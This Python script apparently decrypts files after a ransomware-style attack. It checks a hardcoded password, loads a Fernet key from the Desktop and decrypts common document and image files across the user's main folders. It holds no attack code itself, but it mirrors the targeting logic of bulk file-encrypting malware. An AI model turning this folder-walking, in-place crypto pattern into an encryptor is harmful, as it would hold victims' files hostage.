import os
from cryptography.fernet import Fernet

# Function to decrypt a file
def decrypt_file(file_path, cipher):
    try:
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = cipher.decrypt(encrypted_data)
        with open(file_path, 'wb') as file:
            file.write(decrypted_data)
    except Exception as e:
        print(f'Error decrypting {file_path}: {e}')

# Prompt for the decryption password
password = input("Enter the decryption password: ")

if password != "jenkins":
    print("Incorrect password. Files will not be decrypted.")
    input("Press Enter to close...")
    exit()

# Load the key
key_path = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'encryption_key.key')
if not os.path.exists(key_path):
    print("Encryption key file not found. Cannot decrypt files.")
    input("Press Enter to close...")
    exit()

with open(key_path, 'rb') as key_file:
    key = key_file.read()

cipher = Fernet(key)

# List of file extensions to decrypt
file_extensions = ['.txt', '.docx', '.pdf', '.jpg', '.png']

# Get user folders
user_profile = os.environ['USERPROFILE']
folders_to_search = [
    os.path.join(user_profile, 'Desktop'),
    os.path.join(user_profile, 'Downloads'),
    os.path.join(user_profile, 'Documents'),
    os.path.join(user_profile, 'Videos')
]

# Decrypt files with the specified extensions in the specified folders
for folder in folders_to_search:
    for root, dirs, files in os.walk(folder):
        for file in files:
            if any(file.endswith(ext) for ext in file_extensions):
                file_path = os.path.join(root, file)
                decrypt_file(file_path, cipher)

print('Files decrypted successfully.')
input("Press Enter to close...")
